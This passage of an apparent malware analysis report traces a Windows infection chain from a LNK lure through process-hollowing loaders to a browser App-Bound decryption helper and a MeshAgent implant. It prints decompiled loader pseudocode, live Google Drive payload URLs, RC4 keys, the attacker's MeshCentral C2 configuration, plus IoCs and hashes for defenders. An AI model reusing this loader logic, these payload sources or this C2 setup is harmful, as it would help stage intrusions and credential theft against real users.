| `KERNEL32!CopyFileA` | `0x1B1E` |
| `KERNEL32!CreateFileA` | `0x6AC1`, `0x19D9A`, `0x19DEF`, `0x1A279` |
| `KERNEL32!CreateProcessA` | `0x5C1C` |
| `KERNEL32!OpenProcess` | `0x5CEC` |
| `KERNEL32!ReadProcessMemory` | `0x6018` |
| `KERNEL32!WriteProcessMemory` | `0x58BC` |
| `KERNEL32!VirtualAlloc` | `0x697F`, `0x7125` |
| `KERNEL32!VirtualProtectEx` | `0x5705`, `0x57F9`, `0x587D` |
| `KERNEL32!GetThreadContext` | `0x5E7D`, `0x5F64` |
| `KERNEL32!SetThreadContext` | `0x5E9B` |
| `KERNEL32!ResumeThread` | `0x1DB1`, `0x568D` |
| `KERNEL32!Wow64GetThreadContext` | `0x5E2D`, `0x5F15` |
| `KERNEL32!Wow64SetThreadContext` | `0x5E4B` |
| `SHELL32!SHGetSpecialFolderPathA` | `0x1858`, `0x18F1`, `0x1971` |
| `WININET!InternetOpenA` | `0x1571` |
| `WININET!InternetOpenUrlA` | `0x159C` |
| `WININET!InternetReadFile` | `0x15E7`, `0x1621` |
| `WININET!DeleteUrlCacheEntry` | `0x187A`, `0x1A83`, `0x1AB3` |

### Reconstructed Control Flow

`appload.dll` is the native plugin invoked by `decoded_1.ps1` during the `GetAppKey` routine. Its embedded URLs map to `app64.log`, `agent.log`, and `msh.log`; its strings also reference Chrome, Edge, `%TEMP%\Taskmgr.exe`, and `%TEMP%\Taskmgr.msh`.

Decompiler-style pseudocode:

```
// appload.dll, baby.dll!z, RVA 0x1790
void export_z(void) {
    init_stack_cookie();

    char url_app64[0x103];
    char url_agent[0x103];
    char url_msh[0x103];
    char temp_taskmgr_exe[MAX_PATH];
    char temp_taskmgr_msh[MAX_PATH];

    build_string(url_app64,
        "https://drive.google.com/uc?export=download&id=1EkyeoSdhvGqcEpZkqBUzXnJYPLka7zJc");
    build_string(url_agent,
        "https://drive.google.com/uc?export=download&id=1rqN7zYXO0jNSsZy8gSECxSxY57T0T_xr");
    build_string(url_msh,
        "https://drive.google.com/uc?export=download&id=176jQJH3H3DHPzjFI-tIjrV8KLtEBgY_m");

    temp = SHGetSpecialFolderPathA_or_temp_path();
    snprintf(temp_taskmgr_exe, "%s\\Temp\\Taskmgr.exe", temp);
    snprintf(temp_taskmgr_msh, "%s\\Temp\\Taskmgr.msh", temp);

    download_via_wininet(url_app64, local_blob_1);
    download_via_wininet(url_agent, local_blob_2);
    download_via_wininet(url_msh,   temp_taskmgr_msh);
    DeleteUrlCacheEntry(url_app64);
    DeleteUrlCacheEntry(url_agent);
    DeleteUrlCacheEntry(url_msh);

    // Exact blob transform unresolved; prior AES routine does not apply.
    transform_or_unpack_auxiliary_blobs(local_blob_1, local_blob_2, temp_taskmgr_exe, temp_taskmgr_msh);

    // Browser/application targeting.
    target_path = choose_existing(
        "%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe",
        "%LOCALAPPDATA%\\Microsoft\\Edge\\Application\\msedge.exe",
        temp_taskmgr_exe
    );

    // PE loader / hollowing style execution.
    pi = CreateProcessA(target_path, ..., CREATE_SUSPENDED, ...);
    image = map_auxiliary_payload_to_virtual_image();
    remote = VirtualAllocEx_like(pi.process, image.size);
    WriteProcessMemory(pi.process, remote, image, ...);
    VirtualProtectEx(pi.process, remote, ..., executable_protection, ...);
    ctx = GetThreadContext_or_Wow64GetThreadContext(pi.thread);
    patch_entrypoint(ctx, remote + image.entry_rva);
    SetThreadContext_or_Wow64SetThreadContext(pi.thread, ctx);
    ResumeThread(pi.thread);
}
```

### Correlation With `appload.dll`

`appload.dll` contains the three Google Drive IDs and staging strings:

```
https://drive.google.com/uc?export=download&id=1EkyeoSdhvGqcEpZkqBUzXnJYPLka7zJc
https://drive.google.com/uc?export=download&id=1rqN7zYXO0jNSsZy8gSECxSxY57T0T_xr
https://drive.google.com/uc?export=download&id=176jQJH3H3DHPzjFI-tIjrV8KLtEBgY_m
%s\Temp\Taskmgr.exe
%s\Temp\Taskmgr.msh
\Google\Chrome\Application\chrome.exe
\Microsoft\Edge\Application\msedge.exe
```

Based on this correlation, the likely runtime handling is:

- One downloaded blob is transformed into a masqueraded executable at `%TEMP%\Taskmgr.exe`.
- One downloaded blob is transformed into `%TEMP%\Taskmgr.msh`.
- The plugin then uses its PE-loader/process-injection framework to stage or inject payload material into Chrome/Edge or a spawned `Taskmgr.exe` process.

![](https://www.notion.so/image/attachment%3A0c8feb2d-0ce8-456b-91c9-3e074870352e%3Aimage.png?table=block&id=36f26e60-5e7e-8069-97e9-cf510cbf3c0e&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

This inference is supported by `appload.dll` imports and strings:

```
CreateProcessA
OpenProcess
WriteProcessMemory
ReadProcessMemory
VirtualAlloc
VirtualProtectEx
GetThreadContext
SetThreadContext
ResumeThread
src\pe_raw_to_virtual.cpp
Virtual Protect Failed!
Writing to the remote process failed!
```

### Decrypting

In `appload.dll`, the relevant code is around raw offset 0x0ADF / RVA 0x16DF:

```
; size handling
0x0ADF / RVA 0x16DF   lea ecx, [r13-10h]      ; payload_size = file_size - 0x10
0x0AF0 / RVA 0x16F0   lea edi, [r13-10h]      ; same size kept for later

; split app64.log buffer
0x0B09 / RVA 0x1709   lea rdx, [r12+10h]      ; source = file_buffer + 0x10
0x0B11 / RVA 0x1711   movups xmm0, [r12]      ; load first 16 bytes from file_buffer
0x0B19 / RVA 0x1719   movaps [...], xmm0      ; save those 16 bytes as key material
0x0B20 / RVA 0x1720   call memcpy-like func   ; copy file_buffer+0x10, size-0x10
0x0B29 / RVA 0x1729   call decrypt wrapper    ; decrypt copied payload
```

decrypt wrapper calls the RC4 implementation.

That function has the RC4-looking KSA/PRGA behavior: initializes a 256-byte state array, swaps bytes, then XORs the data stream.

```
key = app64_log[0:16];
ciphertext = app64_log[16:];

plaintext = RC4(key).decrypt(ciphertext);
```

- RCX = RC4 object/context
- RDX = encrypted data buffer
- R8D = data size

the first rsp will take only 32 characters

![](https://www.notion.so/image/attachment%3Ab7994524-f190-4929-b3a5-fefe60bac008%3Aimage.png?table=block&id=36f26e60-5e7e-80b8-88b5-c4068c85a699&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3A863e7e91-d362-44da-8b7c-f4fd9ffd09b2%3Aimage.png?table=block&id=36f26e60-5e7e-80b3-b66d-c07e37aadea8&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1210&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3A39a4b8ad-14dd-48f4-9463-fe8d90be999b%3Aimage.png?table=block&id=36f26e60-5e7e-80f6-a4f3-c78da61cfe3e&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

So the key of each file:

1. app64.log = C1 49 21 C6 41 5E C1 71 A8 1F A9 F4 D7 8D 4C BA
1. agent.log = 28 07 EE 44 7F A2 16 0F 00 57 E7 4A 9D EF F0 8A
1. msh.log = 76 A4 EE B5 25 32 54 03 9E 0D 63 C2 3F C3 6B AC

## 18. End-to-End Payload Graph

```
decoded_1.ps1
- GetAppKey
    - download appload.log
    - AES decrypt -> appload.dll
    - rundll32.exe appload.dll,z
        - download app64.log  [browser/AppBound helper]
        - download agent.log  [MeshCentral remote-control agent]
        - download msh.log    [configuration]
        - stage %TEMP%\Taskmgr.exe / %TEMP%\Taskmgr.msh
        - inject/load into browser or masqueraded Taskmgr process
```

The broader chain now consists of:

```
LNK -> PowerShell -> mshta -> VBScript -> sys.dll + PowerShell RAT/keylogger
                                      - appload.dll -> auxiliary encrypted blobs
```

## 19. Final Stage: MeshAgent

| File | Size | Role |
| --- | --- | --- |
| `app64.dll` | 318,976 | Intermediate native helper, likely Chromium App-Bound/browser key handling |
| `msh.txt` | 35,947 | MeshAgent configuration profile |
| `agent.dll` | 3,484,304 | MeshCentral/MeshAgent remote administration implant |

The chain reconstructed from `appload.dll` and the auxiliary files is:

```
appload.dll,z
  -> downloads app64.log from Google Drive
  -> decrypts app64.log with RC4 using first 16 bytes as key
  -> produces app64.dll
  -> downloads/decrypts msh.log into msh.txt
  -> downloads/decrypts agent.log into agent.dll
  -> prepares MeshAgent configuration and launches/loads the agent
```

The important operational pivot is that the loader moves from custom staging into a legitimate remote-management framework: MeshCentral/MeshAgent.

## 20. `app64.dll` Reverse/Decompiler Notes

`app64.dll` is a 64-bit PE with no export table. It is not the same as `appload.dll`; it is the decrypted payload recovered from `app64.log`.

### PE Summary

```
Machine:    AMD64 / 0x8664
ImageBase:  0x140000000
Entry RVA:  0x0000E590
Sections:   .text, .rdata, .data, .pdata, _RDATA, .rsrc, .reloc
PDB path:   Z:\\WorkSpace\\VC\\1\\AppBound\\x64\\Release\\AppBoundDecrypt.pdb
```

The embedded PDB path is the strongest naming clue: `AppBoundDecrypt.pdb`

The binary references Chromium-family browser install paths and profile `Local State` files:

```
C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe
\\Google\\Chrome\\User Data\\Local State
C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe
\\BraveSoftware\\Brave-Browser\\User Data\\Local State
C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
\\Microsoft\\Edge\\User Data\\Local State
C:\\Program Files\\Naver\\Naver Whale\\Application\\whale.exe
\\Naver\\Naver Whale\\User Data\\Local State
```

It also imports process-enumeration and native process-control APIs:

```
OpenProcess
CreateToolhelp32Snapshot
Process32FirstW
Process32NextW
QueryFullProcessImageNameW
DuplicateHandle
CreateThread
CreateFileMappingW
MapViewOfFile
NtSuspendProcess
NtResumeProcess
NtQuerySystemInformation
```

### Decompiled Behavior Summary

Decompiler-level behavior is consistent with a Chromium/App-Bound helper:

```
int sub_140001F30() {
    BrowserTarget targets[] = {
        { "chrome", "C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe",
          "\\\\Google\\\\Chrome\\\\User Data\\\\Local State" },
        { "brave",  "C:\\\\Program Files\\\\BraveSoftware\\\\Brave-Browser\\\\Application\\\\brave.exe",
          "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Local State" },
        { "edge",   "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe",
          "\\\\Microsoft\\\\Edge\\\\User Data\\\\Local State" },
        { "whale",  "C:\\\\Program Files\\\\Naver\\\\Naver Whale\\\\Application\\\\whale.exe",
          "\\\\Naver\\\\Naver Whale\\\\User Data\\\\Local State" }
    };

    for each target in targets {
        if (browser_exists(target.exe_path)) {
            locate_or_spawn_browser_context(target);
            inspect_browser_processes(target.process_name);
            access_local_state(target.local_state_path);
        }
    }

    return 0;
}
```

High-confidence observations:

- It is browser-focused, not a general downloader.
- The PDB name explicitly says `AppBoundDecrypt`.
- It handles Chrome, Brave, Edge, and Naver Whale.
- It has process and module enumeration logic, plus native suspend/resume APIs.

Analyst interpretation: this stage is likely intended to assist with Chromium App-Bound encryption bypass/decryption or key extraction, complementing the earlier PowerShell credential theft logic.

## 21. `msh.txt` Reverse/Config Notes

`msh.txt` is a MeshAgent configuration/profile file. It is plaintext and starts with MeshCentral-style fields:

```
MeshName=mycoms
MeshType=2
MeshID=0xAFC6ADEAE42BE9C75274C0F6DC503464C6F4FB6D6B77521A6B46AA9CAD91FBBA03D0E6B38F5D5BEADA64E2682C3301B8
ServerID=5A93B1A29F38C43CA42FED5728745C081D04C8390C54525545E10FDECE40C6FCF39941AE33F1C852A596B4418E6CD078
MeshServer=wss://googleoba.servequake.com:8443/agent.ashx
InstallFlags=2
```

The key C2/management server IOC is:

```
wss://googleoba.servequake.com:8443/agent.ashx
```

The rest of the file contains MeshAgent UI translation strings and installer metadata. This is normal for MeshAgent packages, where the `.msh` profile binds an agent binary to a specific MeshCentral server, mesh/group, and server identity.

### Decompiled/Logical Use

In MeshAgent-style logic, this file is consumed as configuration:

```
mesh_config = read_text_file("*.msh");

mesh_name   = parse_value(mesh_config, "MeshName");
mesh_type   = parse_value(mesh_config, "MeshType");
mesh_id     = parse_value(mesh_config, "MeshID");
server_id   = parse_value(mesh_config, "ServerID");
server_url  = parse_value(mesh_config, "MeshServer");

if (server_url == NULL) {
    fail("MeshServer URI not found");
}

connect_control_channel(server_url, mesh_id, server_id);
```

The `ServerID` value is used by MeshAgent to pin/validate the MeshCentral server identity. In this sample it binds the agent to the attacker-controlled `googleoba.servequake.com` endpoint.

![](https://www.notion.so/image/attachment%3A0f83b555-f53f-426d-ace4-57f035be0c45%3Aimage.png?table=block&id=36f26e60-5e7e-80be-9000-c77b482330c5&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## 22. `agent.dll` Reverse/Decompiler Notes

`agent.dll` is a full MeshCentral/MeshAgent binary. It is large, statically rich, and includes MeshAgent core strings, compressed JavaScript modules, TLS/certificate logic, service management, and KVM/remote desktop capability.

### PE Summary

```
Machine:    AMD64 / 0x8664
ImageBase:  0x140000000
Entry RVA:  0x001DA03C
Sections:   .text, .rdata, .data, .pdata, .gfids, .rsrc, .reloc
```

High-signal strings:

```
MeshAgent
MeshCentral
MeshServer
Mesh Agent
Control Channel Connection Established
No MeshCentral settings found, place .msh file with this executable and restart.
agentcore: MeshServer URI not found
wss://swarm.meshcentral.com:443/agent.ashx
wss://meshcentral.com:443/agent.ashx
KVM Session Ending
RemoteDesktopStream
MeshAgent.kvmSession
SelfUpdate -> Starting download
SelfUpdate -> Download Complete... Hash verified
```

Important imports indicate the agent's capability set:

```
WS2_32.dll       network sockets
CRYPT32.dll      certificates and TLS identity material
ncrypt.dll       key generation/storage
USER32.dll       desktop, input, window, hook, and session APIs
GDI32.dll        screen capture/rendering primitives
ADVAPI32.dll     service control, registry, token, privilege APIs
IPHLPAPI.DLL     network adapter discovery
dbghelp.dll      crash dump / diagnostic stack walking
```

### Decompiled Behavior Summary

The agent's control-flow aligns with standard MeshAgent behavior:

![](https://www.notion.so/image/attachment%3A60b1e33b-82d9-4d02-8b69-64e07a01503c%3Aimage.png?table=block&id=36f26e60-5e7e-80c7-a5a3-c989dbe01d1c&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

```
int agent_main(int argc, char **argv) {
    initialize_runtime();
    initialize_crypto();
    initialize_networking();

    config = load_mesh_settings_from_msh_or_database();
    if (!config.MeshServer) {
        log("No MeshCentral settings found, place .msh file with this executable and restart.");
        return ERROR_NO_CONFIG;
    }

    cert = load_or_generate_node_certificate();
    verify_or_pin_mesh_server_id(config.ServerID);

    while (true) {
        status = connect_control_channel(config.MeshServer);
        if (status == CONNECTED) {
            run_meshcore();
            handle_commands();
        }

        sleep(retry_interval);
    }
}
```

Remote administration features visible in strings/imports include:

- Control-channel connection to a MeshCentral server over WebSocket/TLS.
- KVM/remote desktop streaming and input handling.
- Service-mode installation and status management.
- Self-update support.
- Certificate generation and server identity verification.
- Local diagnostics and optional crash dump generation.

### MeshAgent Command Surface

Representative capability strings show that this is more than a beacon:

```
getRemoteDesktopStream
hasKVM
kvmConnected
kvmRefresh
remoteMouseRender
MeshDesktop
AgentCapabilities
serviceName
meshServiceName
SelfUpdate
```

Analyst interpretation: once configured with `msh.txt`, this file can provide the operator with persistent remote management and desktop-control capability through the MeshCentral server.

### Auto Update Command

![](https://www.notion.so/image/attachment%3A41ed3625-ff25-46d5-871d-ebfa0aa51730%3Aimage.png?table=block&id=36f26e60-5e7e-8074-8d04-da3e8ea244a6&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

decrypted into:

```
try
{
    var serviceLocation = process.argv.pop().toLowerCase();
    require('process-manager').enumerateProcesses().then(function (proc)
    {
        for (var p in proc)
        {
            if (proc[p].path && (proc[p].path.toLowerCase() == serviceLocation))
            {
                process.kill(proc[p].pid);
            }
        }
        process.exit();
    });
}
catch (e)
{
    process.exit();
}
```

## 23. Reconstructed Final-Stage Chain

The three auxiliary artifacts fit together as follows:

```
1. app64.dll
   Native helper focused on Chromium/App-Bound browser decryption or browser state extraction.

2. msh.txt
   MeshAgent profile binding the agent to:
   wss://googleoba.servequake.com:8443/agent.ashx

3. agent.dll
   MeshCentral/MeshAgent remote administration component that consumes the .msh profile.
```

Operationally, this means the campaign stages both:

- an infostealer/browser-decryption helper, and
- a remote-management implant.

This combination supports both immediate credential/session theft and longer-term interactive access.

## 24. Native PE Decompilation and Reverse Engineering

This section covers the recovered native PE artifacts:

- `decrypted_stage\sys.dll`
- `decrypted_stage\appload.dll`

### PE Data Directories

`sys.dll`:

| Directory | RVA | Size |
| --- | --- | --- |
| Export | `0x0002B6D0` | `0x3D` |
| Import | `0x0002A968` | `0x64` |
| Resource | `0x00036000` | `0x1B2` |
| Exception | `0x00033570` | `0x1CBC` |
| BaseReloc | `0x00037000` | `0x500` |
| IAT | `0x00022000` | `0x3F0` |

`appload.dll`:

| Directory | RVA | Size |
| --- | --- | --- |
| Export | `0x000291D0` | `0x3D` |
| Import | `0x00028608` | `0x50` |
| Resource | `0x00031000` | `0x1B4` |
| Exception | `0x0002F000` | `0x1AAC` |
| BaseReloc | `0x00032000` | `0x500` |
| IAT | `0x00020000` | `0x370` |

## 25. `sys.dll` Decompilation Notes

### Exported Entry

```
Export DLL name: baby.dll
Export:          k
Export RVA:      0x00001C70
Invocation:      rundll32 sys.dll,k
```

Export stub bytes:

```
40 55 53 48 8D AC 24 08 F7 FF FF 48 81 EC F8 09 00 00
48 8B 05 27 AD 02 00 48 33 C4 48 89 85 E0 08 00 00
33 DB 48 8D 0D D4 42 02 00 45 33 C9 ...
```

The export begins with a large stack frame (`0x9F8`) and stack-cookie setup, indicating MSVC-style compilation. The export contains direct call sites to file/path staging, mutexing, WinINet retrieval, cache deletion, and process-launch/injection helpers.

### Import Call-Site Highlights

High-signal call sites resolved from `.text` to imported APIs:

| API | Call Sites |
| --- | --- |
| `ADVAPI32!RegOpenKeyExA` | `0x1D02` |
| `KERNEL32!CopyFileA` | `0x1C23`, `0x1ED8` |
| `KERNEL32!CreateFileA` | `0x1CBD`, `0x8061`, `0x1BC42`, `0x1BC97`, `0x1C121` |
| `KERNEL32!CreateMutexA` | `0x1D22` |
| `KERNEL32!CreateProcessA` | `0x71BC` |
| `KERNEL32!CreateThread` | `0x1D65`, `0x1D9C` |
| `KERNEL32!OpenProcess` | `0x728C` |
| `KERNEL32!WriteProcessMemory` | `0x6E5C` |
| `KERNEL32!VirtualAlloc` | `0x6531`, `0x66C7`, `0x66E4`, `0x6754`, `0x687C`, `0x7F1F`, `0x86C5` |
| `KERNEL32!VirtualProtectEx` | `0x6CA5`, `0x6D99`, `0x6E1D` |
| `KERNEL32!GetThreadContext` | `0x741D`, `0x7504` |
| `KERNEL32!SetThreadContext` | `0x743B` |
| `KERNEL32!ResumeThread` | `0x2561` |
| `KERNEL32!Wow64GetThreadContext` | `0x73CD`, `0x74B5` |
| `KERNEL32!Wow64SetThreadContext` | `0x73EB` |
| `SHELL32!SHGetSpecialFolderPathA` | `0x1934`, `0x1B7A`, `0x1E75`, `0x2122`, `0x21A3` |
| `SHELL32!ShellExecuteA` | `0x10CC` |
| `WININET!InternetOpenA` | `0x17D1` |
| `WININET!InternetOpenUrlA` | `0x17FC` |
| `WININET!InternetReadFile` | `0x1847`, `0x1881` |
| `WININET!DeleteUrlCacheEntry` | `0x20A2`, `0x2245`, `0x22B7` |

### Reconstructed Control Flow

The export `k` acts as an orchestration routine. The early export region contains call sites to `CreateFileA`, `CopyFileA`, `CreateMutexA`, and `CreateThread`, consistent with a staged loader that copies or materializes payload data, creates a single-instance guard, and launches worker threads.

Decompiler-style pseudocode:

```
// sys.dll, baby.dll!k, RVA 0x1C70
void export_k(void) {
    init_stack_cookie();

    // Staging paths are derived from special folders and environment state.
    temp_or_appdata = resolve_special_folder_or_env();

    // Static strings indicate use of:
    //   %s\Temp\Taskmgr.exe
    //   %s\user.txt
    //   Chrome/Edge application paths
    build_stage_paths(temp_or_appdata);

    // VMware Tools key is probed before or during execution.
    if (RegOpenKeyExA(HKLM_or_HKCU, "SOFTWARE\\VMware, Inc.\\VMware Tools", ...) == SUCCESS) {
        // environment-aware path; exact branch target unresolved statically
        close_key_and_continue_or_abort();
    }

    // WinINet download routine.
    hInet = InternetOpenA(user_agent_chrome_145, ...);
    hUrl  = InternetOpenUrlA(hInet, url_or_payload_source, ...);
    while (InternetReadFile(hUrl, buffer, size, &read) && read != 0) {
        append_to_stage_file(buffer, read);
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);
    DeleteUrlCacheEntry(url_or_payload_source);

    // Loader/injection path.
    payload = map_or_load_pe_from_stage_file();
    target = CreateProcessA("%TEMP%\\Taskmgr.exe" or browser_path, ..., CREATE_SUSPENDED, ...);
    remote = VirtualAllocEx_like(target.process, image_size);
    WriteProcessMemory(target.process, remote, payload_headers_and_sections, ...);
    VirtualProtectEx(target.process, remote, ..., executable_protection, ...);

    ctx = GetThreadContext_or_Wow64GetThreadContext(target.thread);
    patch_entrypoint(ctx, remote_entrypoint);
    SetThreadContext_or_Wow64SetThreadContext(target.thread, ctx);
    ResumeThread(target.thread);
}
```

### Injection Assessment

The combination of `CreateProcessA`, `OpenProcess`, `WriteProcessMemory`, `VirtualProtectEx`, `GetThreadContext`, `SetThreadContext`, `Wow64*ThreadContext`, and `ResumeThread` is a coherent process-hollowing / PE-mapping capability set. The recovered string `src\pe_raw_to_virtual.cpp` further supports a custom PE image mapper. This is stronger evidence than a generic suspicious import table because the import call-site scan confirms these APIs are directly called from `.text`.

## 26. Detection Opportunities

### Function-Level Detection Anchors

`sys.dll`:

- Export: `baby.dll!k`
- Export RVA: `0x1C70`
- Injection cluster: `CreateProcessA` at `0x71BC`, `WriteProcessMemory` at `0x6E5C`, `VirtualProtectEx` at `0x6CA5/0x6D99/0x6E1D`, `SetThreadContext` at `0x743B`, `ResumeThread` at `0x2561`.
- Network cluster: `InternetOpenA` at `0x17D1`, `InternetOpenUrlA` at `0x17FC`, `InternetReadFile` at `0x1847/0x1881`, cache cleanup at `0x20A2/0x2245/0x22B7`.

`appload.dll`:

- Export: `baby.dll!z`
- Export RVA: `0x1790`
- Injection cluster: `CreateProcessA` at `0x5C1C`, `WriteProcessMemory` at `0x58BC`, `VirtualProtectEx` at `0x5705/0x57F9/0x587D`, `SetThreadContext` at `0x5E9B`, `ResumeThread` at `0x1DB1/0x568D`.
- Network cluster: `InternetOpenA` at `0x1571`, `InternetOpenUrlA` at `0x159C`, `InternetReadFile` at `0x15E7/0x1621`, cache cleanup at `0x187A/0x1A83/0x1AB3`.

### Analyst Notes

The two DLLs appear to share a loader framework:

- Both export as `baby.dll` while using different export names (`k`, `z`).
- Both are x64 PE32+ DLLs with similar MSVC runtime artifacts.
- Both use WinINet for retrieval, explicit cache deletion, and a PE-mapping/injection API set.
- Both reference `Taskmgr.exe` staging and browser executable paths.
- Both contain error strings associated with custom PE image mapping.

`sys.dll` appears to be the first native loader invoked by the VBScript stage. `appload.dll` is a later plugin invoked by the PowerShell RAT for application/browser key handling and auxiliary payload staging.

## 27. Indicators and Hashes

### File Identification & Indicators of Compromise

#### File Identification

| Filename | File Size | Architecture | MD5 | SHA-1 | SHA-256 | Compilation Timestamp |
| --- | --- | --- | --- | --- | --- | --- |
| `tax_refund.zip` | 1,048,065 bytes | N/A - ZIP container | `E6349DCE8C03DA21AF31C9C73831A88A` | `C11B3789792869F2A8A7748134C4A81D0E5C52E1` | `89D7EDBE8559FA62E844232C74502E66CA9C3E1501459862929032B4ADF3067F` | N/A |
| `[non-ASCII lure filename].pdf` | 1,054,789 bytes | N/A - PDF lure | `9F7D8CBC031F49B889AAB83EC08D62A7` | `82F39A9F6E94902972536E6AC81011F4C0C9D2E7` | `21117589CEA85FC571CD3C583470071113434AA487A08D5ABEE3D4B5AAB6B3AA` | N/A |
| `[non-ASCII].txt.lnk` | 2,547 bytes | Windows Shell Link; x86/x64 agnostic | `F24D66F1DD6FE26566F1960EE250348B` | `DCDD8A86476CF718F682EE8D19DA7C52AD9B79B6` | `2915D6F2C30BE13B47088829D5F9500F1A09F83E88C87A3AAD230C6D2837CF0D` | N/A - LNK header timestamps: `2025-09-09 19:41:00 UTC` |

#### Network IoCs

| Type | Indicator | Port / Scheme | Context |
| --- | --- | --- | --- |
| Domain | `link24.kr` | HTTPS / 443 | Decoded from PowerShell `-EncodedCommand` embedded in LNK |
| URL | `hxxps://link24[.]kr/1y0mZTc` | HTTPS / 443 | Remote resource passed to `mshta.exe` |

#### Host IoCs

| Type | Indicator | Context |
| --- | --- | --- |
| Archive | `tax_refund.zip` | Delivery container |
| Shortcut | `[non-ASCII].txt.lnk` | Weaponized Shell Link launcher |
| PDF lure | `[non-ASCII lure filename].pdf` | Decoy/lure document |
| Process image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | LNK target path recovered from shortcut strings |
| Process image | `C:\Windows\System32\mshta.exe` | Inferred child process from decoded command |
| Icon resource | `C:\Windows\System32\imageres.dll` | Used for masquerading as a text file |
| LNK CLSID | `00021401-0000-0000-c000-000000000046` | Shell Link CLSID |

#### File Identification

| Filename | File Size | Architecture | MD5 | SHA-1 | SHA-256 | Compilation Timestamp |
| --- | --- | --- | --- | --- | --- | --- |
| `pwko.vba` | 59,102 bytes | N/A - VBScript/HTA script | `D6ADF967E588D13980FE8378B701993B` | `457F597E759CB55D9017BE460B75929E058A0958` | `69C82D2AB46D743871DCCCA6C21A0447D16CE881B1733B7E86DF00468D5DBBC6` | N/A |

Entropy: `4.9511`, consistent with text script containing arithmetic string obfuscation rather than binary packing.

#### Additional Network IoCs

| Type | Indicator | Context |
| --- | --- | --- |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=1u0g1doVUDc5VCeP653aze60SGlhs3efQ` | Downloaded to `%TEMP%\password.txt` |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=1x9mkl4q9ZU8_hDPNF5w0Mu8ePxVWI5VJ` | Conditionally downloaded to `%LOCALAPPDATA%\user.txt` if `WinDefend` is stopped |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=116azn_9bUov3mkSORbPk8_4zIVVNBHZn` | Downloaded to `%LOCALAPPDATA%\sys.log`; AES-decrypted to `sys.dll` |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=1jqpw8UHpsY5ps3nKOfkyo2ql4hC23Mew` | Downloaded to `%LOCALAPPDATA%\pipe.log`; AES-decrypted to `pipe.zip` |

#### Additional Host IoCs

| Type | Indicator | Context |
| --- | --- | --- |
| Script stage | `pwko.vba` | HTA-compatible VBScript returned to `mshta.exe` |
| Dropped file | `%TEMP%\password.txt` | Downloaded and opened/executed through shell association |
| Dropped file | `%LOCALAPPDATA%\user.txt` | Conditional download when `sc query WinDefend` output contains `STOPPED` |
| Dropped encrypted blob | `%LOCALAPPDATA%\sys.log` | AES ciphertext for DLL payload |
| Decrypted payload | `%LOCALAPPDATA%\sys.dll` | Decrypted from `sys.log`; executed via `rundll32 sys.dll,k` |
| Dropped encrypted blob | `%LOCALAPPDATA%\pipe.log` | AES ciphertext for ZIP payload |
| Decrypted archive | `%LOCALAPPDATA%\pipe.zip` | Decrypted from `pipe.log`; expanded with PowerShell |
| Extracted directory | `%LOCALAPPDATA%\pipe\` | Output of `Expand-Archive -Path pipe.zip` |
| Script payload | `%LOCALAPPDATA%\pipe\1.ps1` | Executed with PowerShell policy bypass |
| Script argument | `%LOCALAPPDATA%\pipe\1.log` | Passed to `1.ps1` as `-FileName 1.log` |

### Downloaded Payload Set

### Scope

The following artifacts were retrieved from the Google Drive URLs embedded in `pwko.vba` and placed in the analysis directory. Analysis remained static; no downloaded executable, script, DLL export, or PowerShell payload was executed.

#### File Identification

| Filename | File Size | Architecture | MD5 | SHA-1 | SHA-256 |
| --- | --- | --- | --- | --- | --- |
| `password.txt` | 21 bytes | plaintext | `46E075C946A9DCF1CCB2C82F2C75564E` | `D9D959747610E87181AA7E0A393CC628BA2779B9` | `912FC71662D52486838562581C3F44219A8E7B053590B13D4EDFBFC67E953D68` |
| `user.txt` | 262 bytes | Unknown encrypted/opaque blob | `C43D21DFA6DCAAF84FFF6CB00BD47693` | `FA001EEB4061335E69B3F8578BCA8D3CC16D2CA7` | `0E1F40D7459D0DF0C739AA3F793CA3D556DB44A474613299F96E96BFA6657160` |
| `sys.log` | 199,696 bytes | AES ciphertext | `7AA1CED2B95A6D256ED078A0C6B8CF19` | `32595B5ACB2CDA789AC93554AC5267BD373ACC0F` | `22763195037DD87C25F1217E6D0E457DBBC52C58404D71B73600789E48EA9968` |
| `pipe.log` | 15,440 bytes | AES ciphertext | `50206337F075C23D980C4E7106D0965C` | `81382354885AD4EAE59EE83FB9258A5BFD29009F` | `A3A0D62DB9FD3DE458EF3805F331A29490B7100A1CCF70340BB8B2E95D5D4C20` |
| `sys.dll` | 199,680 bytes | PE32+ DLL, x64 | `77D1EC7FD2AC1DF3B4B0ECB52DFAFC92` | `C6F02E1ACA9CF2C9F81352B7F5ADD08BFD30857F` | `9758E76B601798A30D903BF05052A53DF80451E5C156548CE9DA828F608B6470` |
